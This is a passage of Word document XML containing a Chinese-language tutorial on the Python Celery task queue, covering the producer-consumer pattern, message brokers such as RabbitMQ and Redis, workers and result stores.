          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> MongoDB </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FBE4D5B" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="00B227A8" w:rsidRDefault="00E00B91" w:rsidP="00E00B91">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222226"/>
          <w:kern w:val="36"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222226"/>
          <w:kern w:val="36"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Python 并行分布式框架 Celery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72AA98E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生产者消费者模式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B82DF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实际的软件开发过程中，经常会碰到如下场景：某个模块负责产生数据，这些数据由另一个模块来负责处理（此处的模块是广义的，可以是类、函数、线程、进程等）。产生数据的模块，就形象地称为生产者；而处理数据的模块，就称为消费者。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C8D73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单单抽象出生产者和消费者，还够不上是生产者消费者模式。该模式还需要有一个缓冲区处于生产者和消费者之间，作为一个中介。生产者把数据放入缓冲区，而消费者从缓冲区取出数据，如下图所示：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F53B70"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B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2CDB572D" wp14:editId="75AC204D">
            <wp:extent cx="6026348" cy="1327151"/>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46088" cy="1331498"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF6051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生产者消费者模式是通过一个容器来解决生产者和消费者的强耦合问题。生产者和消费者彼此之间不直接通讯，而通过消息队列（缓冲区）来进行通讯，所以生产者生产完数据之后不用等待消费者处理，直接扔给消息队列，消费者不找生产者要数据，而是直接从消息队列里取，消息队列就相当于一个缓冲区，平衡了生产者和消费者的处理能力。这个消息队列就是用来给生产者和消费者解耦的。</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>-------------&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这里又有一个问题，什么叫做解耦？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2E0F2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lastRenderedPageBreak/>
        <w:t>解耦：假设生产者和消费者分别是两个类。如果让生产者直接调用消费者的某个方法，那么生产者对于消费者就会产生依赖（也就是耦合）。将来如果消费者的代码发生变化，可能会影响到生产者。而如果两者都依赖于某个缓冲区，两者之间不直接依赖，耦合也就相应降低了。生产者直接调用消费者的某个方法，还有另一个弊端。由于函数调用是同步的（或者叫阻塞的），在消费者的方法没有返回之前，生产者只好一直等在那边。万一消费者处理数据很慢，生产者就会白白糟蹋大好时光。缓冲区还有另一个好处。如果制造数据的速度时快时慢，缓冲区的好处就体现出来了。当数据制造快的时候，消费者来不及处理，未处理的数据可以暂时存在缓冲区中。等生产者的制造速度慢下来，消费者再慢慢处理掉。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0509510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因为太抽象，看过网上的说明之后，通过我的理解，我举了个例子：吃包子。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5176099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假如你非常喜欢吃包子（吃起来根本停不下来），今天，你妈妈（生产者）在蒸包子，厨房有张桌子（缓冲区），你妈妈将蒸熟的包子盛在盘子（消息）里，然后放到桌子上，你正在看巴西奥运会，看到蒸熟的包子放在厨房桌子上的盘子里，你就把盘子取走，一边吃包子一边看奥运。在这个过程中，你和你妈妈使用同一个桌子放置盘子和取走盘子，这里桌子就是一个共享对象。生产者添加食物，消费者取走食物。桌子的好处是，你妈妈不用直接把盘子给你，只是负责把包子装在盘子里放到桌子上，如果桌子满了，就不再放了，等待。而且生产者还有其他事情要做，消费者吃包子比较慢，生产者不能一直等消费者吃完包子把盘子放回去再去生产，因为吃包子的人有很多，如果这期间你好朋友来了，和你一起吃包子，生产者不用关注是哪个消费者去桌子上拿盘子，而消费者只去关注桌子上有没有放盘子，如果有，就端过来吃盘子中的包子，没有的话就等待。对应关系如下图：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385A47A9"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B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="67602AB3" wp14:editId="6F52F143">
            <wp:extent cx="6870858" cy="131826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900950" cy="1324033"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A7BF08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考察了一下，原来当初设计这个模式，主要就是用来处理并发问题的，而</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就是一个用</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写的并行分布式框架。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FC6D4C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然后我接着去学习</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Celery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09DE255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是一个强大的</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分布式任务队列</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异步处理框架，它可以让任务的执行完全脱离主程序，甚至可以被分配到其他主机上运行。我们通常使用它来实现异步任务（</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>async task</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）和定时任务（</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>crontab</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）。我们需要一个消息队列来下发我们的任务。首先要有一个消息中间件，此处选择</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>rabbitmq (</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>也可选择</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> redis </w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Amazon Simple Queue Service(SQS)</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>消息队列服务</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。推荐</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选择</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> rabbitmq </w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。使用</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是官方特别推荐的方式，因此我也使用它作为我们的</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>broker</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。它的架构组成如下图：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4A8FD6"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8D0AE9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5BFE882E" wp14:editId="4EBB3BD4">
            <wp:extent cx="4678679" cy="3467100"/>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6065" cy="3472573"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="648D7FF2" w14:textId="77777777" w:rsidR="00A75DA0" w:rsidRPr="00A75DA0" w:rsidRDefault="00E00B91" w:rsidP="00A75DA0">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="999999"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEF0F4"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="999999"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEF0F4"/>
        </w:rPr>
        <w:t>通过celery worker 启动的是启动消费者</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758EEB37" w14:textId="3EA0C6A7" w:rsidR="00A75DA0" w:rsidRPr="00A75DA0" w:rsidRDefault="00E00B91" w:rsidP="00A75DA0">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="999999"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEF0F4"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="999999"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEF0F4"/>
        </w:rPr>
        <w:t>通过celery beat 是启动任务生产者</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="097CBE71" w14:textId="06E29CA9" w:rsidR="00E00B91" w:rsidRPr="00A75DA0" w:rsidRDefault="00E00B91" w:rsidP="00A75DA0">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="999999"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEF0F4"/>
        </w:rPr>
        <w:t>python中使用delay生产任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A2A349" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="008D0AE9" w:rsidRDefault="00E00B91" w:rsidP="00E00B91">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="225" w:after="225"/>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Celery</w:t>
      </w:r>
      <w:r w:rsidRPr="008D0AE9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的定义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="275EDDC5"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（芹菜）是一个简单、灵活且可靠的，处理大量消息的分布式系统，并且提供维护这样一个系统的必需工具。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6E9585"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我比较喜欢的一点是：</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支持使用任务队列的方式在分布的机器、进程、线程上执行任务调度。然后我接着去理解什么是任务队列。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="166B100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任务队列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2453523C"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任务队列是一种在线程或机器间分发任务的机制。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B86924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消息队列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A67666"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消息队列的输入是工作的一个单元，称为任务，独立的职程（</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）进程持续监视队列中是否有需要处理的新任务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6119014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用消息通信，通常使用中间人（</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Broker</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）在客户端和职程间斡旋。这个过程从客户端向队列添加消息开始，之后中间人把消息派送给职程，职程对消息进行处理。如下图所示：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17528238"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8D0AE9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7FF31C2A" wp14:editId="2C8C6388">
            <wp:extent cx="7239627" cy="14707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239627" cy="1470787"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="535A6321"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系统可包含多个职程和中间人，以此获得高可用性和横向扩展能力。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D99B91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的架构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D5E6181"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的架构由三部分组成，消息中间件（</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>message broker</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>），任务执行单元（</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）和任务执行结果存储（</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>task result store</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）组成。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48CF438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消息中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525EEF6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本身不提供消息服务，但是可以方便的和第三方提供的消息中间件集成，包括，</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>RabbitMQ,Redis,MongoDB</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>等，这里我先去了解</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>RabbitMQ,Redis</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F124BCF"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linux</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>安装</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参考：</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://blog.csdn.net/luanpeng825485697/article/details/81205424</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BF3096F"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docker </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>安装</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参考：</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://blog.csdn.net/luanpeng825485697/article/details/81209596</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55BDBAD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docker</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>安装</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>rabbitmq</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参考：</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://blog.csdn.net/luanpeng825485697/article/details/82078416</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB6C4CA" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="00F57BB0" w:rsidRDefault="00E00B91" w:rsidP="00E00B91">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="225" w:after="225"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F57BB0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>任务执行单元</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A87A0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是</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提供的任务执行的单元，</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并发的运行在分布式的系统节点中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5E806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任务结果存储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76703CFD"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Task result store</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>用来存储</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执行的任务的结果，</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支持以不同方式存储任务的结果，包括</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MongoDB</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Django ORM</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AMQP</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
